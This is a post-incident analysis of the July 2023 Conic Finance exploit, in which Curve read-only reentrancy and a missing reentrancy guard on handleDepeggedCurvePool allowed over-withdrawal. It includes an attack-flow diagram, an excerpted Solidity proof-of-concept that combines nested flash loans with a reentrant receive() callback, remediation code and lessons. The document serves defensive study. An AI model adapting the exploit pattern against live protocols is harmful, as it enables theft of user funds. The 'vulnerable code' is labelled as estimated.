# Conic Finance — Curve Read-Only Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-07-21 |
| **Protocol** | Conic Finance |
| **Chain** | Ethereum |
| **Loss** | ~$3,250,000 USD |
| **Attacker** | [0x8d67...c8aa](https://etherscan.io/address/0x8d67db0b205e32a5dd96145f022fa18aae7dc8aa) |
| **Attack Contract** | [0x7435...e4eb](https://etherscan.io/address/0x743599ba5cfa3ce8c59691af5ef279aaafa2e4eb) |
| **Attack Tx** | [0x8b74...b146](https://etherscan.io/tx/0x8b74995d1d61d3d7547575649136b8765acb22882960f0636941c44ec7bbe146) |
| **Vulnerable Contract** | [0xbb78...91e9](https://etherscan.io/address/0xbb787d6243a8d450659e09ea6fd82f1c859691e9) |
| **Root Cause** | Stale virtual_price used during Curve pool ETH callback (read-only reentrancy) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Conic_exp.sol) |

---

## 1. Vulnerability Overview

Conic Finance is a liquidity concentration protocol within the Curve ecosystem that distributes ETH across multiple Curve pools to maximize yield. This incident exploited the **Read-Only Reentrancy** vulnerability in Curve pools.

### Core Mechanism

Curve pool's `remove_liquidity()` function operates in the following order:

```
1. Burn LP tokens
2. Transfer ETH → invoke receiver's receive() (this is the vulnerable window)
3. Update internal balances (balances[])
```

**Problem**: At step 2, `virtual_price` is still based on the pre-step-3 state (old balances), making it a **stale value**. Conic Finance's oracle (`IGenericOracleV2`) used this `virtual_price` directly for Curve LP token price calculation, and the `handleDepeggedCurvePool()` function lacked a `nonReentrant` guard, allowing it to be freely called even during the callback.

The attacker applied this vulnerability sequentially across three different Curve pools (stETH/ETH, cbETH/ETH, rETH/ETH), tricking Conic into treating each pool as "depegged" and then performing an over-withdrawal from the Conic pool.

### Vulnerability Combination

| Vulnerability | Role |
|--------|------|
| Curve read-only reentrancy | Exposes stale virtual_price during ETH callback |
| Missing nonReentrant on handleDepeggedCurvePool | Allows Conic pool state manipulation during callback |
| Multiple nested flash loans | Enables attack without requiring large capital |

---

## 2. Vulnerable Code Analysis

### 2.1 IGenericOracleV2.getUSDPrice() — Dependency on Stale virtual_price (Core Vulnerability)

**Vulnerable Code (estimated)**:
```solidity
// ❌ Vulnerable: directly reads Curve virtual_price
// This function can be called even during Curve's remove_liquidity ETH callback
function getUSDPrice(address token) external returns (uint256) {
    if (isCurveLpToken[token]) {
        ICurvePool pool = curvePoolOf[token];

        // ❌ virtual_price is stale if read before Curve's internal balance update
        // When called during ETH callback: balances not yet updated → returns manipulated price
        uint256 virtualPrice = pool.get_virtual_price();

        uint256 underlyingPrice = getUnderlyingPrice(pool); // ETH price
        return virtualPrice * underlyingPrice / 1e18;
    }
    // ...
}
```

**Fixed Code**:
```solidity
// ✅ Fixed: check Curve pool reentrancy guard state first
function getUSDPrice(address token) external returns (uint256) {
    if (isCurveLpToken[token]) {
        ICurvePool pool = curvePoolOf[token];

        // ✅ claim_admin_fees() triggers Curve's internal nonreentrant lock
        // If called during reentrancy (inside ETH callback) → reverts → blocks stale price return
        pool.claim_admin_fees();

        uint256 virtualPrice = pool.get_virtual_price();
        uint256 underlyingPrice = getUnderlyingPrice(pool);
        return virtualPrice * underlyingPrice / 1e18;
    }
}
```

**Issue**: Calling `get_virtual_price()` during Curve's ETH transfer callback (`receive()`) execution returns a stale price that diverges from the actual liquidity state, because the Curve pool's internal balances have not yet been updated.

---

### 2.2 IConicEthPool.handleDepeggedCurvePool() — Missing nonReentrant

**Vulnerable Code (estimated)**:
```solidity
// ❌ Vulnerable: no nonReentrant guard, freely callable from outside even during callbacks
function handleDepeggedCurvePool(address curvePool_) external {
    // ❌ This logic executes even when oracle price is stale during ETH callback
    require(
        oracle.getUSDPrice(lpTokenOf[curvePool_]) < depegThreshold,
        "Pool is not depegged"
    );

    // ❌ Incorrectly marks a healthy pool as depegged using stale oracle value
    isPoolDepegged[curvePool_] = true;
    _rebalanceAfterDepeg(curvePool_);  // Asset rebalancing → creates condition for over-withdrawal
}
```

**Fixed Code**:
```solidity
// ✅ Fixed: nonReentrant + Curve reentrancy state validation
function handleDepeggedCurvePool(address curvePool_) external nonReentrant {
    // ✅ Validate Curve pool reentrancy state: revert if currently reentrant
    ICurvePool(curvePool_).claim_admin_fees();

    uint256 lpPrice = oracle.getUSDPrice(lpTokenOf[curvePool_]);
    require(lpPrice < depegThreshold, "Pool is not depegged");

    isPoolDepegged[curvePool_] = true;
    _rebalanceAfterDepeg(curvePool_);
}
```

**Issue**: The absence of a `nonReentrant` modifier on `handleDepeggedCurvePool()` allowed this function to be called even during Curve's ETH callback (`receive()`). This was the key entry point for the read-only reentrancy attack.

---

### 2.3 IConicEthPool.withdraw() — Over-Withdrawal Based on Manipulated Pool State

**Vulnerable Code (estimated)**:
```solidity
// ❌ Vulnerable: withdrawal amount calculated using manipulated weights immediately after depegged marking
function withdraw(uint256 conicLpAmount, uint256 minUnderlyingReceived) external nonReentrant {
    // ❌ Depegged pool weight becomes 0, causing over-withdrawal from remaining pools
    uint256 underlyingAmount = calculateWithdrawal(conicLpAmount);
    require(underlyingAmount >= minUnderlyingReceived, "Slippage exceeded");
    _transferUnderlying(msg.sender, underlyingAmount);
}
```

**Issue**: Once a pool is marked as depegged via `handleDepeggedCurvePool()`, the asset rebalancing logic sets that pool's weight to 0. The attacker exploited this manipulated state by calling `withdraw(6,292 ETH)` to withdraw far more assets than actually deposited.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attack capital: none owned directly (all flash loans)
- Multiple flash loan sources:
  - AaveV2: stETH 20,000 ETH
  - AaveV3: cbETH 850 ETH
  - Balancer: rETH 20,550 + cbETH 3,000 + WETH 28,504.2 ETH
- Pre-setup: unlimited approvals for all relevant Curve pools

### 3.2 Execution Phase

```
Attacker Contract (0x7435...e4eb)
         │
         ▼
┌────────────────────────┐
│ [1] AaveV2 Flash Loan  │  Borrow stETH 20,000 ETH
│     executeOperation() │
└──────────┬─────────────┘
           │ nested call
           ▼
┌────────────────────────┐
│ [2] AaveV3 Flash Loan  │  Borrow additional cbETH 850 ETH
│     executeOperation() │
└──────────┬─────────────┘
           │ nested call
           ▼
┌────────────────────────────────────────────┐
│ [3] Balancer Flash Loan                    │
│     receiveFlashLoan()                     │
│     - rETH 20,550 + cbETH 3,000 + WETH 28,504 │
└──────────┬─────────────────────────────────┘
           │
           ▼
┌────────────────────────────────────────────┐
│ [4] 7-iteration loop (pool ratio manipulation) │
│  ConicEthPool.deposit(1,214 ETH)           │
│  cbETH_ETH_Pool.exchange(cbETH → WETH)     │
│  rETH_ETH_Pool.exchange(rETH → WETH)       │
└──────────┬─────────────────────────────────┘
           │
           ▼
┌────────────────────────────────────────────┐
│ [5] reenter_1: LidoCurvePool reentrancy    │
│  add_liquidity(ETH 20,000 + stETH)         │
│  remove_liquidity(steCRV) ──▶ ETH callback │
│         │                                  │
│         ▼ (receive(), nonce=1)             │
│  ┌──────────────────────────────────┐      │
│  │ handleDepeggedCurvePool(LidoPool)│      │ ← read-only reentrancy
│  │ oracle.getUSDPrice(steCRV)       │      │   stale virtual_price read
│  │ → LidoPool marked as depegged    │      │
│  └──────────────────────────────────┘      │
└──────────┬─────────────────────────────────┘
           │
           ▼
┌────────────────────────────────────────────┐
│ [6] reenter_2: cbETH_ETH_Pool reentrancy   │
│  add_liquidity(ETH 1.8)                    │
│  remove_liquidity(cbETH_LP) ──▶ ETH callback │
│         │                                  │
│         ▼ (receive(), nonce=2)             │
│  ┌──────────────────────────────────┐      │
│  │ handleDepeggedCurvePool(cbETH)   │      │ ← read-only reentrancy
│  │ → cbETH_ETH_Pool marked depegged │      │
│  └──────────────────────────────────┘      │
└──────────┬─────────────────────────────────┘
           │
           ▼
┌────────────────────────────────────────────┐
│ [7] reenter_3: rETH_ETH_Pool reentrancy    │
│  add_liquidity(ETH 2.4)                    │
│  remove_liquidity(rETH_LP) ──▶ ETH callback │
│         │                                  │
│         ▼ (receive(), nonce=3)             │
│  ┌──────────────────────────────────┐      │
│  │ ConicEthPool.withdraw(6,292 ETH) │      │ ← over-withdrawal via manipulated pool state
│  │ All 3 pools depegged → weight 0  │      │
│  │ → abnormally large withdrawal calculated │      │
│  └──────────────────────────────────┘      │
└──────────┬─────────────────────────────────┘
           │
           ▼
┌────────────────────────────────────────────┐
│ [8] Flash loan repayment + profit taking   │
│  Rebuy rETH/cbETH/stETH (swaps)           │
│  Repay Balancer/AaveV3/AaveV2             │
│  sellAllTokenToWETH() → finalize profit   │
└────────────────────────────────────────────┘
```

### 3.3 Outcome

| Item | Amount |
|------|------|
| Attacker net profit | ~$3,250,000 (~1,724 ETH) |
| Conic Finance loss | ~$3,250,000 |
| Flash loan capital used | ~72,904 ETH (all repaid) |
| Attacker own capital invested | 0 |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// [Key 1] Attack entry point — 3-level nested flash loans
function testExploit() external {
    deal(address(this), 0);
    // Unlimited approvals for all relevant tokens to Curve pools
    WETH.approve(address(rETH_ETH_Pool), type(uint256).max);
    WETH.approve(address(LidoCurvePool), type(uint256).max);
    // ... (other approvals)

    aaveV2Flashloan(); // Step 1: AaveV2 → AaveV3 → Balancer nested

    sellAllTokenToWETH(); // Convert final profit to WETH
}

// [Key 2] Balancer callback — executes actual attack logic
function receiveFlashLoan(
    address[] memory tokens,
    uint256[] memory amounts,
    uint256[] memory feeAmounts,
    bytes memory userData
) external {
    // Pre-manipulate pool ratios: 7 iterations
    for (uint256 i; i < 7; ++i) {
        ConicEthPool.deposit(1214 ether, 0, false); // Deposit WETH into Conic pool
        cbETH_ETH_Pool.exchange(1, 0, 121 ether, 0); // Swap cbETH → WETH
        rETH_ETH_Pool.exchange(1, 0, 121 ether, 0);  // Swap rETH → WETH
    }

    reenter_1(); // LidoCurvePool reentrancy → mark as depegged
    reenter_2(); // cbETH_ETH_Pool reentrancy → mark as depegged
    reenter_3(); // rETH_ETH_Pool reentrancy → execute over-withdrawal

    // Prepare flash loan repayment (acquire original tokens via swaps)
    // ...
    IERC20(tokens[0]).transfer(msg.sender, amounts[0] + feeAmounts[0]); // Repay rETH
    IERC20(tokens[1]).transfer(msg.sender, amounts[1] + feeAmounts[1]); // Repay cbETH
    IERC20(tokens[2]).transfer(msg.sender, amounts[2] + feeAmounts[2]); // Repay WETH
}

// [Key 3] LidoCurvePool reentrancy trigger
function reenter_1() internal {
    WETH.withdraw(20_000 ether); // Convert WETH → ETH
    uint256[2] memory amount;
    amount[0] = 20_000 ether;
    amount[1] = stETH.balanceOf(address(this));

    // Mint steCRV LP tokens
    LidoCurvePool.add_liquidity{value: 20_000 ether}(amount, 0);
    amount[0] = 0; amount[1] = 0;

    nonce++; // nonce = 1
    // ↓ receive() is called upon ETH transfer (this is the reentrancy entry point)
    LidoCurvePool.remove_liquidity(steCRV.balanceOf(address(this)), amount);
}

// [Key 4] Reentrancy callback — manipulate Conic state upon ETH receipt
receive() external payable {
    if (msg.sender != address(WETH)) {
        if (nonce == 1) {
            // [Vulnerability triggered] Called while stale virtual_price state during Curve ETH callback
            // Marks LidoCurvePool as depegged (actually healthy)
            ConicEthPool.handleDepeggedCurvePool(address(LidoCurvePool));

        } else if (nonce == 2) {
            // Mark cbETH_ETH_Pool as depegged
            ConicEthPool.handleDepeggedCurvePool(address(cbETH_ETH_Pool));

        } else if (nonce == 3) {
            // All 3 pools depegged → execute over-withdrawal
            ConicEthPool.withdraw(6292 ether, 0);
            nonce++;
        }
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Curve Read-Only Reentrancy | CRITICAL | CWE-841 |
| V-02 | Missing nonReentrant on handleDepeggedCurvePool (Misconfiguration) | HIGH | CWE-670 |
| V-03 | Multiple Nested Flash Loan Abuse | MEDIUM | CWE-400 |

### V-01: Curve Read-Only Reentrancy
- **Description**: Curve's `remove_liquidity()` transfers ETH before updating internal balances (`balances[]`). During the `receive()` callback window triggered by the ETH transfer, `get_virtual_price()` returns a value based on the old, unupdated balances. Conic Finance's `IGenericOracleV2` used this stale `virtual_price` directly for LP token price calculation, allowing the attacker to exploit this vulnerable window.
- **Impact**: The oracle trusted the manipulated price, causing `handleDepeggedCurvePool()` to mark healthy pools as depegged. The subsequent abnormal asset rebalancing allowed the attacker to over-withdraw.
- **Attack Conditions**: (1) Conic oracle depends on Curve `virtual_price`, (2) attacker is an ETH-receiving contract, (3) Conic functions callable during callback

### V-02: Missing nonReentrant on handleDepeggedCurvePool
- **Description**: `handleDepeggedCurvePool()` is an externally callable function without a `nonReentrant` modifier. It was possible to call this function during Curve's ETH transfer callback, which was the critical entry point for the read-only reentrancy attack.
- **Impact**: The attacker sequentially marked three healthy Curve pools as depegged, fully manipulating the Conic pool state.
- **Attack Conditions**: Absence of reentrancy guard and access control on `handleDepeggedCurvePool()`

### V-03: Multiple Nested Flash Loan Abuse
- **Description**: A 3-level nested flash loan chain (AaveV2 → AaveV3 → Balancer) was used to source a total of ~72,904 ETH in capital. This enabled the attacker to manipulate Conic pool ratios 7 times and execute the reentrancy attack with zero own capital.
- **Impact**: Zero-capital attack possible. Net profit of ~$3.25M after flash loan repayment.
- **Attack Conditions**: Access to large DeFi lending protocols, support for nested flash loans within a single transaction

---

## 6. Remediation Recommendations

### Immediate Actions

**[Action 1] Add reentrancy detection when querying Curve LP token oracle**

```solidity
// ✅ Modifier to verify Curve pool is not reentrant
modifier verifyCurveNotReentrant(address curvePool) {
    // claim_admin_fees() triggers Curve's internal nonreentrant lock
    // If called during reentrancy (inside ETH callback), internal lock causes revert
    // → Fundamentally blocks stale virtual_price queries
    ICurvePool(curvePool).claim_admin_fees();
    _;
}

function getUSDPrice(address token)
    external
    verifyCurveNotReentrant(curvePoolOf[token])
    returns (uint256)
{
    uint256 virtualPrice = ICurvePool(curvePoolOf[token]).get_virtual_price();
    // ...
}
```

**[Action 2] Apply nonReentrant to handleDepeggedCurvePool**

```solidity
// ✅ Dual validation: nonReentrant + Curve reentrancy state check
function handleDepeggedCurvePool(address curvePool_) external nonReentrant {
    // Verify Curve pool is not currently in ETH callback
    ICurvePool(curvePool_).claim_admin_fees();

    uint256 lpPrice = oracle.getUSDPrice(lpTokenOf[curvePool_]);
    require(lpPrice < depegThreshold, "Pool is not depegged");

    isPoolDepegged[curvePool_] = true;
    _rebalanceAfterDepeg(curvePool_);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Dependency on stale virtual_price | Query oracle only after verifying Curve pool reentrancy guard state |
| handleDepeggedCurvePool exposure | Add `nonReentrant` + strengthen access control (multisig/timelock) |
| Instantaneous price manipulation | Introduce TWAP-based oracle or short-term volatility limiting mechanism |
| Single-block depegged processing | Require minimum observation period and multiple confirmations for depeg determination |
| Nested flash loan capital | Implement circuit breaker limiting large deposits/withdrawals within a single transaction |

---

## 7. Lessons Learned

1. **"Read-only" operations can also be reentrancy attack vectors**: Even calls to view functions that do not modify state can read stale data when they occur during an external contract's callback. This must be considered especially when integrating with any Curve pool that transfers ETH/native tokens.

2. **Essential checklist for all protocols integrating with Curve**:
   - Always verify Curve pool reentrancy state before using `virtual_price` / `get_virtual_price()`
   - Validate Curve internal lock state via `claim_admin_fees()` or similar functions
   - Apply `nonReentrant` to all functions that can receive ETH callbacks

3. **Access control on state-modifying functions**: External callable functions that change protocol state (e.g., `handleDepeggedCurvePool()`) must always have both `nonReentrant` and sufficient access controls.

4. **Flash loan abuse defense**: A circuit breaker or slippage limit on abnormally large deposits/withdrawals within a single transaction could have reduced the damage from this attack.

5. **Danger of compounded vulnerabilities**: Vulnerabilities that are individually low severity can combine into CRITICAL. This attack was a combination of read-only reentrancy (medium) + missing nonReentrant (high) + flash loans (enabling condition).

6. **Related incidents**: Protocols that suffered losses from the same Curve read-only reentrancy pattern:
   - Midas Capital (2022): MATIC collateral Curve pool read-only reentrancy
   - ANKR/Helio (2022): BNB Chain Curve pool read-only reentrancy
   - Numerous Curve fork protocols

---

## 8. On-Chain Verification

On-chain direct verification not performed (cast environment not installed). The following are estimates based on PoC code.

### 8.1 PoC vs On-Chain Amount Comparison

| Item | PoC Value | Notes |
|------|--------|------|
| AaveV2 borrow (stETH) | 20,000 ETH | PoC constant |
| AaveV3 borrow (cbETH) | 850 ETH | PoC constant |
| Balancer borrow (rETH) | 20,550 ETH | PoC constant |
| Balancer borrow (cbETH) | 3,000 ETH | PoC constant |
| Balancer borrow (WETH) | 28,504.2 ETH | PoC constant |
| Withdrawal amount (withdraw) | 6,292 ETH | PoC constant |
| Final profit | ~1,724 ETH ($3.25M) | Based on official post-mortem |

### 8.2 Reference Links

- Official post-mortem: https://medium.com/@ConicFinance/post-mortem-eth-and-crvusd-omnipool-exploits-c9c7fa213a3d
- BlockSec analysis: https://twitter.com/BlockSecTeam/status/1682356244299010049
- Attack Tx: https://etherscan.io/tx/0x8b74995d1d61d3d7547575649136b8765acb22882960f0636941c44ec7bbe146
- Vulnerable contract: https://etherscan.io/address/0xbb787d6243a8d450659e09ea6fd82f1c859691e9#code